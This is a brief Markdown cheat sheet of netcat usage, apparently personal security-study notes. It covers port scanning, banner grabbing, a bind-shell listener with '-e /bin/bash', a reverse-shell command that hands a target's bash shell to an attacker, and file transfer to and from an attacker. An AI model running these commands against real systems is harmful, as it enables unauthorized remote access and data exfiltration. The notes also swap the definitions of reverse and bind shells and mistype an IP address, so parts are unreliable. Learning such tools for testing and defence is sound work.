## NetCat

 `Netcat` and `nc` are same, but ncat is different and comes with encrypted feature made by nmap
 you have to manually install `ncat`. nc is preinstalled.

### Objectives

- Network scan

- Banner Grabbing

- Backdoor

- Execute Binary files

- Share files throw netcat

### Switches

- `-l` : listen, listening requests

- `-v`: verbose, display detaileds

- `-p` : port, specify port number

- `-w` : timeout, set time then stop sending request

- `-n` : dont't resolve, if ip is given no need to resolve the ip

- `-e` : execute commands,

- `-z` : port scan, to scan ports

### Banner grabbing

```bash
nc -zvw 1 192.168.0.2 1-100
```

`nc` :  tool name nc
`-z` : scan networks
`-v` : verbose, show details
`-w` : set timeout `1` for example
`192.168.0.1` : ip of target/ victim
`1-100` : range of port

scan for particular port open
```bash
nc -zvw 1 192.168.0.2 22
```

in above example we scan only `22` port, it will only show port open
or connection refused means port closed or firewall is blocking your requests.
or timeout.

```bash
nc -zvnw 1 192.168.0.2 1-100
```

`-n` : don't resolve, if domain name given then it should be resolve into ip.
we already given ip then no need to resolve ip again time save.

```bash
echo "" | nc -vn 192.168.0.2 80
```

we are sending empty string to` port 80` and waiting for infomative response

### Backdoor

`Listener` : attacker wait for victim/target to send request.

```bash
nc -lvp <port_number> -e /bin/bash
```

`-l` : listen
`v` : verbose
`p` : specify port number
`-e` : execute command `/bin/bash ` this will return bash shell

`/bin/bash` :  binary bash shell 

`Initiator` : victim send request to listener

```bash
# nc -v <ip of listener or attacker> <port>
nc -v 192.168.0.2 22
```

`-v` : verbose
`specify ip address of listener`
`specify port number of listener`


#### Shells
- Reverse shell

when attacker/listener is listening a request from initiator/victim/target

- Bind shell

when attacker/initiator request to victim/target/listener


**Reverse shell**

**Attacker**
```bash
nc -lvp 2211
```

**Target**
```
nc -v 192.168.0.1 2211 -e /bin/bash
```

when target execute command in terminal a request goes to listener or attcaker
and `/bin/bash` this  execute on target machine, which attacker got bash shell
of Target machine.

### File Sharing

**Rec. file as an attacker**

**recv.**

```bash
nc -lvp 2211 > recv.txt
```

**sender**

```bash
# attacker ip: 192.168.0.1
nc -v 129.168.0.1 2211 < send.txt
```

**Send file as an attacker**

**sender**

```bash
nc -lvp 2211 < send.txt
```

**recv.**

```bash
nc -v 192.168.0.1 2211 > recv.txt
```
